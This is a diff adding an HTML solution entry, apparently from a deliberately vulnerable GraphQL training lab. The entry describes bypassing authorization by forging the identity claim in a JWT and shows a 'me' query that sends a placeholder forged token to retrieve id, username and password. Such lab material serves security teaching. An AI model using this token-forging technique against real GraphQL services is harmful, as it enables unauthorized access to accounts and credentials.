@@ -1,0 +1,21 @@
+<!-- Start -->
+<h3 style="color:purple" id="bypassauthz-token"><b>Authorization Bypass :: GraphQL JWT Token Forge</b></h3>
+<hr />
+<h5>Problem Statement</h5>
+<p>
+  Without logging in a user is able to forge the user identity claim within the JWT token for the <code>me</code> query operation.
+</p>
+<h5>Exploitation Solution <button class="reveal" onclick="reveal('sol-brokenauthz-token')">Show</button></h5>
+<div id="sol-brokenauthz-token" style="display:none">
+  <pre class="bash">
+
+query {
+    me(token: "FORGED_TOKEN") {
+        id
+        username
+        password
+    }
+}
+</pre>
+</div>
+<!-- End -->
